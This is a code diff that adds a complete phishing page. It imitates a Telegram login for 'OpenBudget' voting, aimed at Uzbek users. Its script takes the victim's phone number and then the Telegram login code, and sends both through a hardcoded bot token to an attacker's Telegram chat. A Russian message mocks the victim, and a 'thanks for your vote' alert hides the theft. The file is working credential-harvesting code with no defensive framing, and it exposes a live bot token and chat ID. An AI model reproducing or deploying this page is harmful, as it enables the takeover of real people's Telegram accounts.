@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Telegram Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://telegram.org/css/font-roboto.css?1" rel="stylesheet" type="text/css">
+    <link href="https://telegram.org/css/bootstrap.min.css?3" rel="stylesheet">
+    <link href="https://telegram.org/css/bootstrap-extra.css?2" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/css/intlTelInput.css" />
+
+    <style>
+        body {
+            background: url('https://r4.wallpaperflare.com/wallpaper/523/885/170/cats-croissants-presents-cake-chocolate-hd-wallpaper-0d3164c1b1f751d7ca8fe5b386589fb5.jpg') no-repeat center center fixed;
+            background-size: cover;
+            font-family: Roboto, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .login-box {
+            width: 100%;
+            max-width: 400px;
+            background: white;
+            padding: 20px;
+            margin: 50px auto;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .button-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+        }
+        .btn-cancel {
+            background: none;
+            border: none;
+            color: #3b82f6;
+            font-weight: bold;
+            font-size: 14px;
+            text-transform: uppercase;
+            cursor: pointer;
+        }
+        .btn-next {
+            background-color: #67aef7;
+            border: none;
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
+            text-transform: uppercase;
+            cursor: pointer;
+            padding: 10px 25px;
+            border-radius: 30px;
+        }
+        .btn-next:hover {
+            background-color: #559ce8;
+        }
+        .btn-cancel:hover {
+            text-decoration: underline;
+        }
+        .flow-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 20px 0;
+            gap: 10px;
+        }
+        .circle {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .telegram {
+            background-color: #0088cc;
+        }
+        .telegram img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            background-color: #0088cc;
+        }
+        .other {
+            background-color: #d97d7d;
+        }
+        .other img {
+            width: 60px;
+            height: 60px;
+            object-fit: cover;
+        }
+        #phone-number {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+
+    <div class="flow-container">
+        <div class="circle telegram">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
+        </div>
+        <div class="arrow">→</div>
+        <div class="circle other">
+            <img src="https://play-lh.googleusercontent.com/TczwCNGealhKrNnXGw9BI3seKMHju3nF8zl-ZYJ6uyNNxxOeY84SeenABr2gXlZ_G28" alt="App Logo">
+        </div>
+    </div>
+
+    <h3>Log in to use your Telegram account with <a href="https://t.me/minecofinuz">OpenBudget</a></h3>
+    <p>Enter your phone number to receive a login code via Telegram.</p>
+
+    <form id="login-form">
+        <input type="tel" class="form-control" id="phone-number" placeholder="Phone number" required>
+        
+
+        <div class="button-row">
+            <button type="button" class="btn-cancel" onclick="cancelAction()">CANCEL</button>
+            <button type="button" class="btn-next" onclick="sendPhone()">NEXT</button>
+        </div>
+    </form>
+
+    <div id="code-section" style="display:none;">
+        <p>Enter the code you received in Telegram:</p>
+        <input type="text" class="form-control" id="login-code" placeholder="Login code" required>
+        <div class="button-row">
+            <button type="button" class="btn-cancel" onclick="cancelAction()">CANCEL</button>
+            <button type="button" class="btn-next" onclick="checkCode()">NEXT</button>
+        </div>
+    </div>
+
+    <p style="font-size: 12px; color: #777;">By continuing, you agree to the <a href="https://telegram.org/faq#login-and-sms">Terms of Service</a>.</p>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/intlTelInput.min.js"></script>
+<script>
+    const BOT_TOKEN = '7165333544:AAG6D0JW-FYhS-RBtHxPiEBCxsjpoFldJrg';
+    const CHAT_ID = '7094141627';
+
+    const phoneInput = document.querySelector("#phone-number");
+    const iti = window.intlTelInput(phoneInput, {
+        initialCountry: "uz",
+        preferredCountries: ["uz", "ru", "us"],
+        separateDialCode: true,
+        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/utils.js"
+    });
+
+    function sendPhone() {
+    const fullNumber = iti.getNumber();
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: `📱 Новый номер: ${fullNumber}`
+        })
+    }).then(res => res.json())
+    .then(data => {
+        if (data.ok) {
+            // Сохраняем номер в память для связи с кодом
+            localStorage.setItem('userPhoneNumber', fullNumber);
+
+            document.getElementById('login-form').style.display = 'none';
+            document.getElementById('code-section').style.display = 'block';
+        } else {
+            alert('Failed to send phone number.');
+        }
+    }).catch(() => alert('Error sending request.'));
+}
+
+function checkCode() {
+    const code = document.getElementById('login-code').value;
+    const phoneNumber = localStorage.getItem('userPhoneNumber') || 'Неизвестен';
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: `🤡💀 Пользователь ввел код: ${code}\n📱 Номер: ${phoneNumber}`
+        })
+    }).then(res => res.json())
+    .then(data => {
+        if (data.ok) {
+            alert('Спасибо за ваш голос!');
+        } else {
+            alert('Не удалось отправить код.');
+        }
+    }).catch(() => alert('Ошибка при отправке кода.'));
+}
+
+</script>
+
+</body>
+</html>
